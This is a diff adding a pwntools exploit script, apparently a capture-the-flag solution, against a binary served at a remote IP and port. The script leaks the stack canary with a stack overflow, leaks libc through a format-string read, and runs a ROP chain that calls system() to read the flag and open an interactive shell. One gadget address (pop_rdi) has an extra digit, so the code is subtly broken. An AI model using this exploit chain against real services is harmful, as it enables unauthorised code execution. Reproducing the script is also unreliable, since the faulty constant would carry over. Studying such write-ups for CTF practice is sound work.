@@ -1,0 +1,111 @@
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
+from pwn import *
+
+#lambs:
+wait = lambda x: raw_input(x)
+
+#context.log_level='debug'
+
+
+def overflow(buf):
+	p.recvuntil("Guess your option:")
+	p.sendline("1")
+	p.recvuntil("Oh,man.Play with the stack is really dangerous,so u can only play once..\n")
+	p.send(buf)
+
+def read(buf,flag):
+	p.recvuntil("Guess your option:")
+	p.sendline("2")
+	p.recvuntil("Ok, as u r bored, do something boring to make u more bored...\n")
+	p.sendline(str(buf))
+	p.recvuntil("Satisfied?y/n\n")
+	p.sendline(str(flag))
+
+def stack_spray():
+	p.recvuntil("Ok, as u r bored, do something boring to make u more bored...\n")
+	p.sendline('aaaa')
+	p.recvuntil("Satisfied?y/n\n")
+	p.sendline('n')
+
+def format(buf):
+	#p.recvuntil("Guess your option:")
+	p.sendline("3")
+	p.recvuntil("This is a really powerful weapon...(to leak the secret code I think?)\n")
+	p.send(buf)
+
+def secret(buf):
+	p.recvuntil("Guess your option:")
+	p.sendline("9011")
+	p.recvuntil("Input your secret code:")
+	p.send(buf)
+	#p.recvuntil("So...Close ur mouth...")
+
+p = process("./pwn")
+p = remote("106.75.64.61",16356)
+
+'''
+p.recvuntil("Guess your option:")
+for i in range(255):
+	
+	if (chr(i) == 's')|( chr(i) == 'S')|(chr(i)=='n'):
+		continue
+	print chr(i)
+	format("%"+chr(i))
+	print p.recv()
+'''
+#overflow("a"*0x108+'b')
+#gdb.attach(p)
+
+#step1:leak canary	
+read('aaaa','n')
+for i in range(99):
+	stack_spray()
+p.recvuntil("Ok, as u r bored, do something boring to make u more bored...\n")
+p.sendline('aaaa')
+p.recvuntil("Satisfied?y/n\n")
+p.sendline('y')
+overflow('a'*0xa8+'b')
+p.recvuntil('b')
+canary = u64(p.recvuntil('\n',drop=True).rjust(8,'\x00'))
+log.success('canary:%#x' % canary)
+
+#step2:leak libc
+
+format('%a')
+p.recvuntil('0x0.0')
+stdout = int(p.recvuntil('p',drop=True),16)
+log.success('stdout:%#x' % stdout)
+libcbase = stdout - 0x3c56a3
+log.success('libc_base:%#x' % libcbase)
+#one_gadget = libcbase + 0xf02a4
+#log.success('one_gadget:%#x' % one_gadget)
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+#read_addr = libcbase + libc.symbols['read']
+system = libcbase + libc.symbols['system']
+#log.success('read:%#x' % read_addr)
+log.success('system:%#x' % system)
+#binsh_str = libcbase + libc.search('cat').next()
+close = libcbase + libc.symbols['close']
+
+#step3:ROP 
+
+pop_rdi = 0x400c5e3
+pop_rsi_r15 = 0x400c51
+pop_rbx_rbp_r12_r13_r14_r15 = 0x400C4A
+magic = 0x400C30 
+bss = 0x602080+0x48
+
+elf = ELF('./pwn')
+
+payload = 'a'*8+p64(canary)+'b'*8+p64(pop_rdi)+p64(666)+p64(close)+p64(pop_rdi)+p64(bss)+p64(system)+"sh flag\0"
+
+read(payload,'y')
+for i in range(1022):
+	print i
+	secret("\x00")
+
+
+
+
+p.interactive()
